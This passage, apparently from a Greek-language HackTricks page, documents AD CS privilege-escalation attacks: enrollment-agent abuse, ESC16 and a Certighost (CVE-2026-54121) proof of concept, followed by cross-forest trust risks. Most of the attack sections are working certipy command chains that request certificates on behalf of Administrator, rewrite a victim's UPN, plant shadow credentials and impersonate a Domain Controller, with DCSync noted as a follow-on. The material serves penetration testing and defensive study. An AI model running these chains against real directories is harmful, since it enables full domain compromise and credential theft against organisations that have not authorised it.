**Βήμα 2: Authenticate μέσω Schannel (LDAPS) χρησιμοποιώντας το ληφθέν certificate.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Σενάριο B: PKINIT/Kerberos Impersonation μέσω Enrollment Agent Abuse

**Βήμα 1: Request ενός certificate από ένα V1 template (με "Enrollee supplies subject"), inject-άροντας το "Certificate Request Agent" Application Policy.** Αυτό το certificate προορίζεται για τον attacker (`attacker@corp.local`), ώστε να γίνει enrollment agent. Δεν καθορίζεται UPN για την identity του ίδιου του attacker εδώ, καθώς ο στόχος είναι η δυνατότητα του agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Εγχέει το OID `1.3.6.1.4.1.311.20.2.1`.

**Βήμα 2: Χρησιμοποιήστε το πιστοποιητικό "agent" για να ζητήσετε ένα πιστοποιητικό για λογαριασμό ενός προνομιούχου χρήστη-στόχου.** Πρόκειται για ένα βήμα παρόμοιο με το ESC3, που χρησιμοποιεί το πιστοποιητικό από το Βήμα 1 ως πιστοποιητικό agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Βήμα 3: Κάντε authenticate ως ο προνομιούχος χρήστης χρησιμοποιώντας το πιστοποιητικό "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Explanation

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** αναφέρεται στο σενάριο όπου, αν η διαμόρφωση του AD CS δεν επιβάλλει τη συμπερίληψη του extension **szOID_NTDS_CA_SECURITY_EXT** σε όλα τα certificates, ένας attacker μπορεί να το εκμεταλλευτεί:

1. Ζητώντας ένα certificate **χωρίς SID binding**.

2. Χρησιμοποιώντας αυτό το certificate **για authentication ως οποιοσδήποτε λογαριασμός**, όπως για impersonation ενός λογαριασμού με υψηλά privileges (π.χ. ενός Domain Administrator).

Μπορείτε επίσης να ανατρέξετε σε αυτό το άρθρο για να μάθετε περισσότερα σχετικά με τη λεπτομερή αρχή:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuse

Το παρακάτω αναφέρεται σε [αυτό το link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Κάντε click για να δείτε πιο λεπτομερείς μεθόδους χρήσης.<sup>[[14]](#references)</sup>

Για να εντοπίσετε αν το περιβάλλον Active Directory Certificate Services (AD CS) είναι ευάλωτο στο **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Βήμα 1: Ανάγνωση του αρχικού UPN του λογαριασμού-θύματος (Προαιρετικό - για επαναφορά).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Βήμα 2: Ενημερώστε το UPN του λογαριασμού-θύματος στο `sAMAccountName` του administrator-στόχου.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Βήμα 3: (Εάν χρειάζεται) Αποκτήστε διαπιστευτήρια για τον λογαριασμό "victim" (π.χ. μέσω Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Βήμα 4: Ζητήστε ένα certificate ως ο χρήστης _victim_ από _οποιοδήποτε κατάλληλο client authentication template_ (π.χ., "User") στην ευάλωτη στο ESC16 CA.** Επειδή η CA είναι ευάλωτη στο ESC16, θα παραλείψει αυτόματα το SID security extension από το εκδοθέν certificate, ανεξάρτητα από τις συγκεκριμένες ρυθμίσεις του template για αυτήν την extension. Ορίστε τη μεταβλητή περιβάλλοντος για το Kerberos credential cache (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Στη συνέχεια, ζητήστε το πιστοποιητικό:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Βήμα 5: Επαναφορά του UPN του λογαριασμού "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Βήμα 6: Authenticate ως ο διαχειριστής-στόχος.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Επεξήγηση

Το **Certighost** εκμεταλλεύεται ένα **AD CS enrollment chase / callback path**, όπου η CA εμπιστεύεται attributes του request που παρέχονται από τον requester για να προσδιορίσει την ταυτότητα που πρέπει να τοποθετηθεί στο εκδιδόμενο certificate. Στο public PoC, το crafted request περιλαμβάνει:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP ελεγχόμενο από τον attacker, στο οποίο θα συνδεθεί η CA
- **`rmd`**: το **DNS name του target Domain Controller** που θα πλαστοπροσωπηθεί

Αν η CA ακολουθήσει αυτό το chase, θα συνδεθεί στον attacker μέσω **SMB/LSA (`445`)** και **LDAP (`389`)**. Ο attacker χρησιμοποιεί έναν **πραγματικό machine account** (συνήθως δημιουργημένο μέσω του default **`ms-DS-MachineAccountQuota`**), ώστε η callback session να πραγματοποιεί authentication ως έγκυρο domain principal, αλλά οι rogue services επιστρέφουν τα identity attributes του **target DC**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Αν η CA **δεν συνδέει κρυπτογραφικά την identity που επιστράφηκε με το authenticated callback principal**, μπορεί να εκδώσει certificate για τον **Domain Controller**, παρότι η session έκανε authentication ως ο machine account που ελέγχεται από τον attacker. Αυτό καθιστά το bug εννοιολογικά διαφορετικό από το **Certifried**: αντί να τροποποιεί AD attributes όπως το `dNSHostName`, ο attacker **αντικαθιστά identity data κατά τη διάρκεια του CA callback resolution**.<sup>[[2]](#references)</sup>

**Χρήσιμες προϋποθέσεις:**

- **Domain credentials** με χαμηλά δικαιώματα
- Δυνατότητα **δημιουργίας ή επαναχρησιμοποίησης computer account**
- Network reachability από την **CA** προς τα ports **`389` και `445`** που ελέγχονται από τον attacker
- Vulnerable / unpatched CA request path (το **Microsoft update της 14ης Ιουλίου 2026** πρόσθεσε **DC validation για το `cdc`** και **resolved-SID comparison**)

Το παραγόμενο **`.pfx`** μπορεί στη συνέχεια να χρησιμοποιηθεί για **PKINIT**, παράγοντας ένα **`.ccache`** και, στη δημοσιευμένη ροή του PoC, το **NT hash του target DC**, κάτι που συνήθως αρκεί για **πλήρες domain compromise**.

### Abuse

Το public PoC αυτοματοποιεί ολόκληρη την αλυσίδα:<sup>[[1]](#references)</sup>

1. Δημιουργία ή επαναχρησιμοποίηση ενός **machine account** που ελέγχεται από τον attacker.
2. Εκκίνηση **rogue LDAP και SMB/LSA listeners** στα `389` και `445`.
3. Υποβολή certificate request που περιέχει τα attacker-controlled **`cdc`** και target **`rmd`** attributes.
4. Αναμονή ώστε η CA να πραγματοποιήσει authentication στους rogue listeners ως το controlled machine account, αλλά απάντηση στα identity lookups με τα attributes του **target DC**.
5. Λήψη ενός CA-signed **DC certificate** και χρήση του για **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Χρήσιμα runtime flags από το PoC:

- `--listener <ip>`: επιλέγει ρητά το callback IP που διαφημίζεται στο `cdc`
- `--computer-name <NAME$>`: επαναχρησιμοποιεί έναν υπάρχοντα machine account αντί να δημιουργήσει νέο

**Operational notes:**

- Το PoC χρειάζεται **root**, επειδή κάνει bind στις **privileged ports** `389` και `445`.
- Η επιτυχής exploitation αποθηκεύει τοπικά ένα **DC `.pfx`** και ένα **Kerberos `.ccache`**.
- Επειδή το certificate αντιστοιχίζεται σε έναν **Domain Controller account**, οι follow-on ενέργειες μπορούν να περιλαμβάνουν **certificate-based Kerberos auth**, **DCSync** και επαναχρησιμοποίηση του ανακτημένου **machine NT hash**.<sup>[[2]](#references)</sup>

## Compromising Forests with Certificates Explained in Passive Voice

### Breaking of Forest Trusts by Compromised CAs

Η ρύθμιση για **cross-forest enrollment** γίνεται σχετικά απλή. Το **root CA certificate** από το resource forest **δημοσιεύεται στα account forests** από τους administrators, ενώ τα **enterprise CA** certificates από το resource forest **προστίθενται στα `NTAuthCertificates` και AIA containers σε κάθε account forest**. Για διευκρίνιση, αυτή η διάταξη παρέχει στο **CA του resource forest πλήρη έλεγχο** όλων των άλλων forests για τα οποία διαχειρίζεται PKI. Αν αυτό το CA **compromised από attackers**, certificates για όλους τους users τόσο στο resource forest όσο και στα account forests θα μπορούσαν να **forged από αυτούς**, καταργώντας έτσι το security boundary του forest.<sup>[[6]](#references)</sup>

### Enrollment Privileges Granted to Foreign Principals

Σε multi-forest environments, απαιτείται προσοχή σχετικά με τα Enterprise CAs που **δημοσιεύουν certificate templates** τα οποία επιτρέπουν σε **Authenticated Users ή foreign principals** (users/groups εξωτερικοί προς το forest στο οποίο ανήκει το Enterprise CA) **δικαιώματα enrollment και edit**.\
Κατά την authentication μέσω trust, το **Authenticated Users SID** προστίθεται από το AD στο token του user. Επομένως, αν ένα domain διαθέτει Enterprise CA με template που **παρέχει δικαιώματα enrollment στους Authenticated Users**, θα μπορούσε να γίνει **enrollment στο template από user διαφορετικού forest**. Παρομοίως, αν τα **δικαιώματα enrollment παραχωρούνται ρητά σε foreign principal από ένα template**, δημιουργείται έτσι μια **cross-forest access-control relationship**, επιτρέποντας σε principal ενός forest να **κάνει enrollment σε template άλλου forest**.

Και τα δύο σενάρια οδηγούν σε **αύξηση του attack surface** από το ένα forest στο άλλο. Οι ρυθμίσεις του certificate template θα μπορούσαν να exploited από attacker για την απόκτηση πρόσθετων privileges σε foreign domain.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Τεχνική ανάλυση του Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Blog της SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Κατάχρηση των Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, Νέες μέθοδοι Authentication και Request και άλλα](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Κατάχρηση του Key Trust Account Mapping για Account Takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Η ιστορία του Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying προς το AD Certificate Services μέσω RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell access στο ADCS CA με YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Τεχνική κατάχρησης ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Τεχνική κατάχρησης ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Όχι απλώς ένα ακόμη AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration και Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
{{#include ../../../banners/hacktricks-training.md}}
